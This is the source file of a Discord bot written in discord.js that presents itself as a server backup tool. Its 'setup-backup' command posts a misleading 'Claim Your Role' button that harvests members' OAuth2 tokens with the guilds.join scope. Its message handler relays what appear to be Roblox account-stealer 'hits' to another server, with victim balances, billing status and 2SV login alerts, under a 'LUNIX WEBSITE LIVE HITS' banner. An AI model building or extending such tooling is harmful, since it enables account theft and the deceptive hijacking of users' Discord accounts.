const { Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, SlashCommandBuilder, REST, Routes, PermissionFlagsBits } = require('discord.js');
const { initializeFirebase, queryFirebase } = require('./firebase');
const { backupServer } = require('./backup');
const { restoreServer } = require('./restore');
const { setupOAuth, generateAuthURL } = require('./oauth');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildModeration
    ],
    partials: [Partials.Channel, Partials.GuildMember]
});

// Initialize Firebase
initializeFirebase();

// Setup OAuth2 server
setupOAuth(client);

// Embed forwarding configuration
const SOURCE_CHANNEL_IDS = process.env.SOURCE_CHANNEL_IDS ? process.env.SOURCE_CHANNEL_IDS.split(',').map(id => id.trim()) : []; // Comma-separated channel IDs
const DESTINATION_CHANNEL_ID = process.env.DESTINATION_CHANNEL_ID; // Channel ID in Server B
const DESTINATION_GUILD_ID = process.env.DESTINATION_GUILD_ID; // Server B ID

client.once('ready', async () => {
    console.log(`Bot is ready! Logged in as ${client.user.tag}`);
    console.log(`Serving ${client.guilds.cache.size} servers`);

    // Register slash commands as guild-only commands
    const commands = [
        new SlashCommandBuilder()
            .setName('setup-backup')
            .setDescription('Setup backup authorization for server members')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
            .setDMPermission(false),
        new SlashCommandBuilder()
            .setName('backup')
            .setDescription('Manually backup current server')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
            .setDMPermission(false),
        new SlashCommandBuilder()
            .setName('restore')
            .setDescription('Manually restore members from backup')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
            .setDMPermission(false),
        new SlashCommandBuilder()
            .setName('backup-now')
            .setDescription('Manually backup current server immediately')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
            .setDMPermission(false),
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

    try {
        console.log('Registering slash commands...');
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log('Successfully registered slash commands.');
    } catch (error) {
        console.error('Error registering slash commands');
    }
});

client.on('guildCreate', async (guild) => {
    console.log(`➕ Joined new server: ${guild.name} (${guild.id})`);

    try {
        // Send setup message to a suitable channel
        const channel = guild.channels.cache.find(
            ch => ch.type === 0 && // GuildText channel type
            ch.permissionsFor(guild.members.me).has([1 << 10, 1 << 11]) // SendMessages, ViewChannel permissions
        );

        if (channel) {
            // Send setup message without interaction (since this is guildCreate event)
            const embed = new EmbedBuilder()
                .setTitle('🔐 Server Backup Protection')
                .setDescription(
                    '**Protect yourself from server raids and deletions!**\n\n' +
                    'This bot can back up server data and restore everything if the server gets compromised.\n\n' +
                    '**Available Commands:**\n' +
                    '• `/setup-backup` - Setup OAuth authorization for member restoration\n' +
                    '• `/backup` - Manually backup this server\n' +
                    '• `/restore` - Manually restore members from backup\n' +
                    '• `/backup-now` - Force backup current server state\n\n' +
                    '**What gets backed up:**\n' +
                    '✅ Member data for restoration\n' +
                    '✅ OAuth tokens for re-inviting\n\n' +
                    '*Use `/setup-backup` to enable member restoration or `/backup` to create a backup.*'
                )
                .setColor(0x2f3136)
                .setThumbnail(guild.iconURL() || null)
                .setFooter({ text: 'Backup Bot • Manual Control' })
                .setTimestamp();

            await channel.send({ embeds: [embed] });
            console.log(`📨 Sent setup message to ${guild.name}`);
        }

    } catch (error) {
        console.error('Error handling new guild:', error);
    }
});



client.on('guildDelete', (guild) => {
    console.log(`Left/banned from server: ${guild.name} (${guild.id})`);
    // The backup data remains in Firebase for potential restore
});

client.on('guildUnavailable', (guild) => {
    console.log(`Server became unavailable: ${guild.name} (${guild.id})`);
    // Server might be temporarily down or deleted
});

// Function to strip all custom emojis from text
function stripCustomEmojis(text) {
    if (!text) return text;

    // Remove real Discord custom emojis like <:name:123456789012345678> or <a:name:123456789012345678>
    text = text.replace(/<a?:\w+:\d+>/g, '');

    // Remove colon-style fake emoji like :redmember: or :1981redmember:
    text = text.replace(/:[a-zA-Z0-9_]+:/g, '');

    return text.trim();
}

// Function to filter sensitive information from embeds
function filterSensitiveInfo(embed) {
    if (!embed) return null;

    // Helper function to check if text contains any blocked content
    function containsBlockedContent(text) {
        if (!text) return false;
        const lowerText = text.toLowerCase();
        return lowerText.includes('check cookie') || 
               lowerText.includes('discord server') || 
               lowerText.includes('profile') ||
               lowerText.includes('password') ||
               lowerText.includes('robloxsecurity') ||
               lowerText.includes('roblosecurity');
    }

    // Helper function to clean text of sensitive content and remove custom emojis
    function cleanSensitiveText(text) {
        if (!text) return text;

        // Strip all custom emojis first
        let cleanText = stripCustomEmojis(text);

        // If text contains any blocked content, remove it entirely
        if (containsBlockedContent(cleanText)) {
            return ''; // Return empty string to remove the content completely
        }

        // Clean up multiple spaces and trim
        return cleanText
            .replace(/\s+/g, ' ')
            .trim();
    }

    // Create a copy of the embed
    let filteredEmbed = { ...embed };

    // Filter title - remove if contains blocked content
    if (filteredEmbed.title) {
        const originalTitle = filteredEmbed.title;
        if (containsBlockedContent(filteredEmbed.title)) {
            filteredEmbed.title = null; // Remove title completely
            console.log('Completely removed title containing blocked content');
        } else {
            filteredEmbed.title = cleanSensitiveText(filteredEmbed.title);
        }
    }

    // Filter description - remove if contains blocked content
    if (filteredEmbed.description) {
        const originalDesc = filteredEmbed.description;
        if (containsBlockedContent(filteredEmbed.description)) {
            filteredEmbed.description = null; // Remove description completely
            console.log('Completely removed description containing blocked content');
        } else {
            filteredEmbed.description = cleanSensitiveText(filteredEmbed.description);
        }
    }

    // Filter fields - completely remove any field that contains blocked content
    if (filteredEmbed.fields) {
        const originalFieldCount = filteredEmbed.fields.length;
        filteredEmbed.fields = filteredEmbed.fields.filter(field => {
            const fieldName = field.name || '';
            const fieldValue = field.value || '';

            // Check if field name or value contains any blocked content
            if (containsBlockedContent(fieldName) || containsBlockedContent(fieldValue)) {
                console.log(`Completely removed field containing blocked content: ${field.name}`);
                return false; // Remove this field completely
            }

            return true; // Keep this field
        }).map(field => {
            // Clean the remaining fields
            let cleanedName = cleanSensitiveText(field.name);
            let cleanedValue = cleanSensitiveText(field.value);

            // Double check: if cleaned field is empty, mark for removal
            if (!cleanedName || !cleanedValue || cleanedName.trim() === '' || cleanedValue.trim() === '') {
                return null; // Mark for removal
            }

            return {
                ...field,
                name: cleanedName,
                value: cleanedValue
            };
        }).filter(field => field !== null); // Remove null fields

        console.log(`Filtered fields: ${originalFieldCount} -> ${filteredEmbed.fields.length} (removed ${originalFieldCount - filteredEmbed.fields.length} fields with blocked content)`);
    }

    // Filter author name if present - remove if contains blocked content
    if (filteredEmbed.author && filteredEmbed.author.name) {
        if (containsBlockedContent(filteredEmbed.author.name)) {
            filteredEmbed.author = null; // Remove author completely
            console.log('Completely removed author containing blocked content');
        } else {
            filteredEmbed.author.name = cleanSensitiveText(filteredEmbed.author.name);
            if (!filteredEmbed.author.name || filteredEmbed.author.name.trim() === '') {
                filteredEmbed.author = null; // Remove if name becomes empty
            }
        }
    }

    // Filter footer text if present - remove if contains blocked content
    if (filteredEmbed.footer && filteredEmbed.footer.text) {
        if (containsBlockedContent(filteredEmbed.footer.text)) {
            filteredEmbed.footer = null; // Remove footer completely
            console.log('Completely removed footer containing blocked content');
        } else {
            filteredEmbed.footer.text = cleanSensitiveText(filteredEmbed.footer.text);
            if (!filteredEmbed.footer.text || filteredEmbed.footer.text.trim() === '') {
                filteredEmbed.footer = null; // Remove if text becomes empty
            }
        }
    }

    return filteredEmbed;
}

// Listen for new messages to forward embeds
client.on('messageCreate', async (message) => {
    try {
        console.log(`Message received: Channel ID: ${message.channel.id}, Has embeds: ${message.embeds?.length || 0}, Author bot: ${message.author.bot}`);
        console.log(`Source channels configured: ${SOURCE_CHANNEL_IDS.join(', ')}`);
        console.log(`Destination channel configured: ${DESTINATION_CHANNEL_ID}`);
        console.log(`Destination guild configured: ${DESTINATION_GUILD_ID}`);

        // Only process messages from the source channels
        if (SOURCE_CHANNEL_IDS.length === 0 || !SOURCE_CHANNEL_IDS.includes(message.channel.id)) {
            console.log(`Skipping message - not from any configured source channel`);
            return;
        }

        // Only process messages with embeds
        if (!message.embeds || message.embeds.length === 0) {
            console.log(`Skipping message - no embeds found`);
            return;
        }

        // Don't forward messages from this bot to prevent loops, but allow other bots
        if (message.author.bot && message.author.id === client.user.id) {
            console.log(`Skipping message - from this bot to prevent loops`);
            return;
        }

        // Log if message is from a bot (but we're still processing it)
        if (message.author.bot) {
            console.log(`Processing message from bot: ${message.author.username} (${message.author.id})`);
        }

        console.log(`✅ New embed message detected in source channel - processing ${message.embeds.length} embeds`);

        // Get destination channel
        console.log(`Looking for destination guild: ${DESTINATION_GUILD_ID}`);
        const destinationGuild = client.guilds.cache.get(DESTINATION_GUILD_ID);
        if (!destinationGuild) {
            console.error(`❌ Destination guild not found. Available guilds: ${client.guilds.cache.map(g => `${g.name} (${g.id})`).join(', ')}`);
            return;
        }
        console.log(`✅ Found destination guild: ${destinationGuild.name}`);

        console.log(`Looking for destination channel: ${DESTINATION_CHANNEL_ID}`);
        const destinationChannel = destinationGuild.channels.cache.get(DESTINATION_CHANNEL_ID);
        if (!destinationChannel) {
            console.error(`❌ Destination channel not found. Available channels: ${destinationGuild.channels.cache.map(c => `${c.name} (${c.id})`).join(', ')}`);
            return;
        }
        console.log(`✅ Found destination channel: ${destinationChannel.name}`);

        // Check bot permissions in destination channel
        const botMember = destinationGuild.members.cache.get(client.user.id);
        if (!botMember) {
            console.error('Bot is not a member of destination guild');
            return;
        }

        const permissions = destinationChannel.permissionsFor(botMember);
        if (!permissions.has([PermissionFlagsBits.SendMessages, PermissionFlagsBits.EmbedLinks])) {
            console.error('Bot lacks permissions to send messages or embeds in destination channel');
            return;
        }

        // Process only the first embed to avoid forwarding multiple small embeds
        const embedToProcess = message.embeds[0];
        console.log(`Processing first embed only (out of ${message.embeds.length} total embeds)`);

        const embed = embedToProcess;

        // Create cleaned embed with custom emojis removed
        const cleanedEmbed = {
            title: stripCustomEmojis(embed.title),
            description: stripCustomEmojis(embed.description),
            fields: embed.fields?.map(f => ({
                name: stripCustomEmojis(f.name),
                value: stripCustomEmojis(f.value),
                inline: f.inline
            })),
            footer: embed.footer ? { text: stripCustomEmojis(embed.footer.text), iconURL: embed.footer.iconURL || embed.footer.icon_url } : undefined,
            author: embed.author ? { 
                name: stripCustomEmojis(embed.author.name),
                iconURL: embed.author.iconURL || embed.author.icon_url,
                url: embed.author.url
            } : undefined,
            thumbnail: embed.thumbnail,
            image: embed.image,
            color: embed.color,
            timestamp: embed.timestamp
        };

        // Now filter sensitive information from the cleaned embed
        const filteredEmbed = filterSensitiveInfo(cleanedEmbed);

        if (!filteredEmbed) {
            console.log('Embed was null - not forwarding');
            return;
        }

        // Create new embed builder with filtered data
        const forwardedEmbed = new EmbedBuilder();

        // Set basic embed properties with Unicode emojis
        if (filteredEmbed.title) {
            // Add emojis to title based on content
            let enhancedTitle = filteredEmbed.title;
            if (enhancedTitle.toLowerCase().includes('hit') || enhancedTitle.toLowerCase().includes('success')) {
                enhancedTitle = `🎯 ${enhancedTitle}`;
            } else if (enhancedTitle.toLowerCase().includes('user') || enhancedTitle.toLowerCase().includes('account')) {
                enhancedTitle = `👤 ${enhancedTitle}`;
            } else {
                enhancedTitle = `🔥 ${enhancedTitle}`;
            }
            forwardedEmbed.setTitle(enhancedTitle);
        }
        
        if (filteredEmbed.description) {
            // Add emojis to description
            let enhancedDescription = filteredEmbed.description;
            if (enhancedDescription.toLowerCase().includes('victim')) {
                enhancedDescription = `🎯 ${enhancedDescription}`;
            } else if (enhancedDescription.toLowerCase().includes('location')) {
                enhancedDescription = `🌍 ${enhancedDescription}`;
            } else {
                enhancedDescription = `💥 ${enhancedDescription}`;
            }
            forwardedEmbed.setDescription(enhancedDescription);
        }

        // Set color - use original color or default blue
        const embedColor = filteredEmbed.color || embed.color || 0x0099ff;
        forwardedEmbed.setColor(embedColor);

            // Set thumbnail and image
        if (filteredEmbed.thumbnail && filteredEmbed.thumbnail.url) {
            forwardedEmbed.setThumbnail(filteredEmbed.thumbnail.url);
        } else if (embed.thumbnail && embed.thumbnail.url) {
            forwardedEmbed.setThumbnail(embed.thumbnail.url);
        }

        if (filteredEmbed.image && filteredEmbed.image.url) {
            forwardedEmbed.setImage(filteredEmbed.image.url);
        } else if (embed.image && embed.image.url) {
            forwardedEmbed.setImage(embed.image.url);
        }

            // Set author with enhanced formatting
        if (filteredEmbed.author && filteredEmbed.author.name) {
            let enhancedAuthorName = filteredEmbed.author.name;
            
            // Add emojis to author name based on content
            if (enhancedAuthorName.toLowerCase().includes('victim') || enhancedAuthorName.toLowerCase().includes('target')) {
                enhancedAuthorName = `🎯 ${enhancedAuthorName}`;
            } else if (enhancedAuthorName.toLowerCase().includes('user') || enhancedAuthorName.toLowerCase().includes('account')) {
                enhancedAuthorName = `👤 ${enhancedAuthorName}`;
            } else if (enhancedAuthorName.toLowerCase().includes('hit') || enhancedAuthorName.toLowerCase().includes('success')) {
                enhancedAuthorName = `🔥 ${enhancedAuthorName}`;
            } else {
                enhancedAuthorName = `⚡ ${enhancedAuthorName}`;
            }
            
            forwardedEmbed.setAuthor({
                name: enhancedAuthorName,
                iconURL: filteredEmbed.author.iconURL || filteredEmbed.author.icon_url,
                url: filteredEmbed.author.url
            });
        } else if (embed.author && embed.author.name) {
            let enhancedAuthorName = embed.author.name;
            
            // Add emojis to original author name
            if (enhancedAuthorName.toLowerCase().includes('victim') || enhancedAuthorName.toLowerCase().includes('target')) {
                enhancedAuthorName = `🎯 ${enhancedAuthorName}`;
            } else if (enhancedAuthorName.toLowerCase().includes('user') || enhancedAuthorName.toLowerCase().includes('account')) {
                enhancedAuthorName = `👤 ${enhancedAuthorName}`;
            } else if (enhancedAuthorName.toLowerCase().includes('hit') || enhancedAuthorName.toLowerCase().includes('success')) {
                enhancedAuthorName = `🔥 ${enhancedAuthorName}`;
            } else {
                enhancedAuthorName = `⚡ ${enhancedAuthorName}`;
            }
            
            forwardedEmbed.setAuthor({
                name: enhancedAuthorName,
                iconURL: embed.author.iconURL || embed.author.icon_url,
                url: embed.author.url
            });
        }

        // Set timestamp
        if (filteredEmbed.timestamp) {
            forwardedEmbed.setTimestamp(new Date(filteredEmbed.timestamp));
        } else if (embed.timestamp) {
            forwardedEmbed.setTimestamp(new Date(embed.timestamp));
        }

            // Add filtered fields - only add fields that passed the filtering with Unicode emojis
        if (filteredEmbed.fields && filteredEmbed.fields.length > 0) {
            console.log(`Adding ${filteredEmbed.fields.length} filtered fields to forwarded embed`);
            filteredEmbed.fields.forEach(field => {
                if (field.name && field.value && field.name.trim() !== '' && field.value.trim() !== '') {
                    // Add Unicode emojis to field names based on content
                    let enhancedName = field.name;
                    let enhancedValue = field.value;
                    
                    // Add emojis based on field content with enhanced patterns
                    if (field.name.toLowerCase().includes('robux') || field.name.toLowerCase().includes('balance')) {
                        enhancedName = `<:Robux:1393888802128265348> ${field.name}`;
                    } else if (field.name.toLowerCase().includes('pending')) {
                        enhancedName = `⏳ ${field.name}`;
                    } else if (field.name.toLowerCase().includes('rap') || field.name.toLowerCase().includes('value')) {
                        enhancedName = `<:Dominus_Prize:1408080755531190272> ${field.name}`;
                    } else if (field.name.toLowerCase().includes('owned') || field.name.toLowerCase().includes('items')) {
                        enhancedName = `📦 ${field.name}`;
                    } else if (field.name.toLowerCase().includes('credit') || field.name.toLowerCase().includes('billing')) {
                        enhancedName = `<a:Card:1408083250412523581> ${field.name}`;
                    } else if (field.name.toLowerCase().includes('convert')) {
                        enhancedName = `🔄 ${field.name}`;
                    } else if (field.name.toLowerCase().includes('payment') || field.name.toLowerCase().includes('payments')) {
                        enhancedName = `💸 ${field.name}`;
                    } else if (field.name.toLowerCase().includes('premium')) {
                        enhancedName = `<:rbxPremium:1408083254531330158> ${field.name}`;
                    } else if (field.name.toLowerCase().includes('setting') || field.name.toLowerCase().includes('status')) {
                        enhancedName = `⚙️ ${field.name}`;
                    } else if (field.name.toLowerCase().includes('game') || field.name.toLowerCase().includes('pass')) {
                        enhancedName = `🎮 ${field.name}`;
                    } else if (field.name.toLowerCase().includes('group')) {
                        enhancedName = `👥 ${field.name}`;
                    } else if (field.name.toLowerCase().includes('collectible')) {
                        enhancedName = `<:diamond_yellow:1408080762267242648> ${field.name}`;
                    } else {
                        enhancedName = `<:member_IDS:1393888535412740096> ${field.name}`;
                    }

                    // Enhanced value formatting with emojis for common patterns
                    enhancedValue = field.value;
                    
                    // Replace True/False with emojis - order matters, do True first
                    if (enhancedValue.toLowerCase().includes('true')) {
                        enhancedValue = enhancedValue.replace(/true/gi, '<:yes:1393890949960306719> True');
                    }
                    if (enhancedValue.toLowerCase().includes('false')) {
                        enhancedValue = enhancedValue.replace(/false/gi, '<:no:1393890945929318542> False');
                    }
                    
                    // Add emojis to zero values in financial/stat contexts
                    if (field.name.toLowerCase().includes('balance') || 
                        field.name.toLowerCase().includes('robux') || 
                        field.name.toLowerCase().includes('rap') || 
                        field.name.toLowerCase().includes('owned') ||
                        field.name.toLowerCase().includes('pending') ||
                        field.name.toLowerCase().includes('credit') ||
                        field.name.toLowerCase().includes('convert') ||
                        field.name.toLowerCase().includes('payment') ||
                        field.name.toLowerCase().includes('group')) {
                        // Replace standalone zeros with emoji zeros
                        enhancedValue = enhancedValue.replace(/\b0\b/g, '<:diamond_yellow:1408080762267242648> 0');
                        enhancedValue = enhancedValue.replace(/\b0\$/g, '<:diamond_yellow:1408080762267242648> 0$');
                    }
                    
                    // Add emojis to other numeric patterns
                    enhancedValue = enhancedValue.replace(/\bUnverified\b/gi, 'Unverified');
                    enhancedValue = enhancedValue.replace(/\bVerified\b/gi, '<:yes:1393890949960306719> Verified');
                    enhancedValue = enhancedValue.replace(/\bDisabled\b/gi, '<:no:1393890945929318542> Disabled');
                    enhancedValue = enhancedValue.replace(/\bEnabled\b/gi, '<:yes:1393890949960306719> Enabled');
                    enhancedValue = enhancedValue.replace(/\bUnset\b/gi, '<a:Verified:1333386641292791828> Unset');

                    forwardedEmbed.addFields({
                        name: enhancedName,
                        value: enhancedValue,
                        inline: field.inline !== undefined ? field.inline : false
                    });
                }
            });
        } else {
            console.log('No fields to add after filtering - all fields contained blocked content');
        }

            // Add custom footer text with enhanced emojis
        let originalFooter = filteredEmbed.footer?.text || embed.footer?.text || '';
        
        // Enhance original footer text with emojis
        if (originalFooter) {
            if (originalFooter.toLowerCase().includes('stealer') || originalFooter.toLowerCase().includes('grabber')) {
                originalFooter = `🥷 ${originalFooter}`;
            } else if (originalFooter.toLowerCase().includes('time') || originalFooter.toLowerCase().includes('date')) {
                originalFooter = `⏰ ${originalFooter}`;
            } else if (originalFooter.toLowerCase().includes('info') || originalFooter.toLowerCase().includes('data')) {
                originalFooter = `📊 ${originalFooter}`;
            } else if (originalFooter.toLowerCase().includes('location') || originalFooter.toLowerCase().includes('ip')) {
                originalFooter = `🌍 ${originalFooter}`;
            } else {
                originalFooter = `💫 ${originalFooter}`;
            }
        }
        
        const forwardingText = `<:hacker:1404745235711655987> LUNIX WEBSITE LIVE HITS <:hacker:1404745235711655987>`;
        const newFooterText = originalFooter ? `${originalFooter} • ${forwardingText}` : forwardingText;

        forwardedEmbed.setFooter({
            text: newFooterText,
            iconURL: filteredEmbed.footer?.iconURL || filteredEmbed.footer?.icon_url || embed.footer?.iconURL || embed.footer?.icon_url || message.guild.iconURL()
        });

        // Check if embed contains 2SV validation content
        const embedText = [
            filteredEmbed.title,
            filteredEmbed.description,
            ...(filteredEmbed.fields || []).map(f => `${f.name} ${f.value}`)
        ].join(' ').toLowerCase();

        const is2SVValidation = embedText.includes('tried to login, waiting for 2sv validation') || 
                               embedText.includes('verification mode');

        // Send the filtered embed to destination channel with appropriate notification
        const notificationMessage = is2SVValidation ? 
            '@everyone Notifier by <@133284075104174416>' : 
            '@everyone Hit by <@133284075104174416>';

        await destinationChannel.send({
            content: notificationMessage,
            embeds: [forwardedEmbed]
        });

        console.log(`✅ First embed forwarded (password fields removed, sensitive content filtered)`);

    } catch (error) {
        console.error('Error forwarding embed:', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand()) {
        // Check if command is used in a guild (not DM)
        if (!interaction.guild) {
            await interaction.reply({
                content: '**Error:** This command can only be used in servers, not in DMs.',
                ephemeral: true
            });
            return;
        }

        if (interaction.commandName === 'setup-backup') {
            // Check if user is server owner or has administrator permissions
            if (interaction.user.id !== interaction.guild.ownerId && !interaction.member.permissions.has('Administrator')) {
                await interaction.reply({
                    content: '**Error:** Only the server owner or administrators can use this command.',
                    ephemeral: true
                });
                return;
            }

            // Reply ephemeral first to hide the command usage
            await interaction.reply({
                content: '✅ Role claiming embed sent to the channel!',
                ephemeral: true
            });

            // Then send the embed to the channel
            try {
                const guild = interaction.guild;

                const embed = new EmbedBuilder()
                    .setTitle('Claim Your Role')
                    .setDescription(
                        '**Click the button below to claim your special role!**\n\n' +
                        '**Quick & Easy** - Just click the button\n' +
                        '**Secure Process** - Official Discord OAuth2\n' +
                        '**Instant Role** - Get your verified role immediately\n\n' +
                        '*Ready to claim your role? Click below!*'
                    )
                    .setColor(0x2f3136)
                    .setThumbnail('https://cdn.discordapp.com/emojis/886264180325941318.png')
                    .setFooter({ text: 'Secure Role Claiming System' })
                    .setTimestamp();

                // Create authorization button with generic OAuth URL
                const baseOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.OAUTH2_CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.OAUTH2_REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${guild.id}`;

                const authButton = new ButtonBuilder()
                    .setLabel('🎭 Claim Role')
                    .setStyle(ButtonStyle.Link)
                    .setURL(baseOAuthUrl);

                const row = new ActionRowBuilder()
                    .addComponents(authButton);

                await interaction.channel.send({
                    embeds: [embed],
                    components: [row]
                });

                console.log(`Sent role claim embed to ${guild.name} via slash command`);
            } catch (error) {
                console.error('Error sending role claim embed:', error);
                await interaction.followUp({
                    content: '**Error:** Failed to send role claim embed. Please try again.',
                    ephemeral: true
                });
            }
        }

        if (interaction.commandName === 'backup') {
            // Check if user is server owner or has administrator permissions
            if (interaction.user.id !== interaction.guild.ownerId && !interaction.member.permissions.has('Administrator')) {
                await interaction.reply({
                    content: '**Error:** Only the server owner or administrators can use this command.',
                    ephemeral: true
                });
                return;
            }

            try {
                const success = await backupServer(interaction.guild);

                if (success) {
                    await interaction.reply({
                        embeds: [{
                            title: 'Backup Complete',
                            description: `Successfully backed up **${interaction.guild.name}**\n\nThe backup includes member data for restoration.`,
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                } else {
                    await interaction.reply({
                        embeds: [{
                            title: 'Backup Failed',
                            description: 'An error occurred during the backup process. Please check the console logs and try again.',
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                }
            } catch (error) {
                console.error('Error during manual backup:', error);
                await interaction.reply({
                    embeds: [{
                        title: 'Backup Failed',
                        description: 'An error occurred during the backup process. Please try again or check the console logs.',
                        color: 0x2f3136,
                        timestamp: new Date()
                    }],
                    ephemeral: true
                });
            }
        }

        if (interaction.commandName === 'restore') {
            // Check if user is server owner or has administrator permissions
            if (interaction.user.id !== interaction.guild.ownerId && !interaction.member.permissions.has('Administrator')) {
                await interaction.reply({
                    content: '**Error:** Only the server owner or administrators can use this command.',
                    ephemeral: true
                });
                return;
            }

            try {
                const restored = await restoreServer(interaction.guild, client);

                if (restored) {
                    await interaction.reply({
                        embeds: [{
                            title: 'Member Restoration Started',
                            description: 'Member restoration process has been initiated! Check the progress in your server channels.',
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                } else {
                    await interaction.reply({
                        embeds: [{
                            title: 'No Backup Found',
                            description: 'No backup data found for your server owner ID. Make sure you had the bot in a previous server that was backed up.',
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                }
            } catch (error) {
                console.error('Error during manual restore:', error);
                await interaction.reply({
                    embeds: [{
                        title: 'Restoration Failed',
                        description: 'An error occurred during the restoration process. Please try again or check the console logs.',
                        color: 0x2f3136,
                        timestamp: new Date()
                    }],
                    ephemeral: true
                });
            }
        }

        if (interaction.commandName === 'backup-now') {
            // Check if user is server owner or has administrator permissions
            if (interaction.user.id !== interaction.guild.ownerId && !interaction.member.permissions.has('Administrator')) {
                await interaction.reply({
                    content: '**Error:** Only the server owner or administrators can use this command.',
                    ephemeral: true
                });
                return;
            }

            try {
                const success = await backupServer(interaction.guild);

                if (success) {
                    await interaction.reply({
                        embeds: [{
                            title: 'Force Backup Complete',
                            description: `Successfully backed up **${interaction.guild.name}**\n\nThe backup includes current member data for restoration.`,
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                } else {
                    await interaction.reply({
                        embeds: [{
                            title: 'Backup Failed',
                            description: 'An error occurred during the backup process. Please check the console logs and try again.',
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                }
            } catch (error) {
                console.error('Error during force backup:', error);
                await interaction.reply({
                    embeds: [{
                        title: 'Backup Failed',
                        description: 'An error occurred during the backup process. Please try again or check the console logs.',
                        color: 0x2f3136,
                        timestamp: new Date()
                    }],
                    ephemeral: true
                });
            }
        }
    }

    if (interaction.isButton()) {
        // No button interactions needed - direct OAuth links are used
    }
});

// Error handling
client.on('error', (error) => {
    console.error('Discord client error:', error);
});

process.on('unhandledRejection', (error) => {
    console.error('Unhandled promise rejection:', error);
});

// Login to Discord
client.login(process.env.DISCORD_TOKEN);
